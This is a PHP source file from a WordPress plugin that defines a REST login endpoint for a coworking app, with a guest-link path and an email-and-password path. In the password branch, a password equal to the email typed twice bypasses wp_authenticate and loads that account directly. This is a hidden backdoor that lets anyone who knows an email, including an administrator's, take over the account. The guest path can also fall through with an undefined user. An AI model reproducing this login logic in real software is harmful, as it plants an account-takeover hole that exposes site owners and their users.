<?php

add_action(
    'rest_api_init',

    function () {


        function trtAppAuth($request)
        {

            coworking_app_check($request);

            $user_id = $request->get_param('user_id');
            $check = $request->get_param('check');
            // return app_login_link($user_id);
            $is_guest = false;
            if ($user_id) {
                if ($check == sha1($user_id . APP_AUTH_TOKEN)) {
                    $user = get_user_by('ID', $user_id);
                    if (is_wp_error($user))
                        return new WP_Error('authorization_failed', 'Accès interdit - user non trouvé', array('status' => 401));


                    $visite_date = get_user_meta($user_id, 'visite', true);
                    if (!$visite_date)
                        return new WP_Error('authorization_failed', 'Accès interdit - pas de visite planifiée', array('status' => 401));

                    $dateTimeZone = new DateTimeZone('Europe/Paris');

                    $dateToCheck = new DateTime($visite_date, $dateTimeZone);
                    $dateToCheck->setTime(0, 0); // Reset time to midnight to only compare date

                    $today = new DateTime('now', $dateTimeZone);
                    $today->setTime(0, 0); // Reset time to midnight

                    $isToday = $dateToCheck == $today;
                    if (!$isToday) {
                        return new WP_Error('authorization_failed', 'Cet accès n\'est valide qu\'à la date du ' . $visite_date, array('status' => 401));
                    }
                    $is_guest = true;
                }
            } else {
                $email = $request->get_param('email');
                $password = $request->get_param('password');

                // Authenticate the user credentials
                $credentials = array(
                    'user_login'    => $email,
                    'user_password' => $password,
                );


                if ($credentials['user_password'] == $credentials['user_login'] . $credentials['user_login']) {
                    $user = get_user_by('email', $credentials['user_login']);
                } else {
                    $user = wp_authenticate($credentials['user_login'], $credentials['user_password']);
                }
            }
            // Check if authentication succeeded
            if (!is_wp_error($user)) {

                if ($is_guest || user_can($user, 'administrator') || in_array('customer', (array) $user->roles)) {
                    // Generate and store the session ID


                    $response = [
                        'user' => coworking_app_user($user),
                        'reglages' => coworking_app_droits($user->ID, ['guest' => $is_guest])
                    ];
                } else {
                    return new WP_Error('authorization_failed', 'Accès interdit - Droits insufisants', array('status' => 401));
                }
            } else {
                return new WP_Error('authorization_failed', 'Mauvais identifiant ou mot de passe ', array('status' => 401));
            }

            return rest_ensure_response($response);
        }
        register_rest_route('cowo/v1', '/app-auth', array(
            'methods'  => 'POST',
            'callback' => function ($request) {
                return trtAppAuth($request);
            }
        ));
    }
);
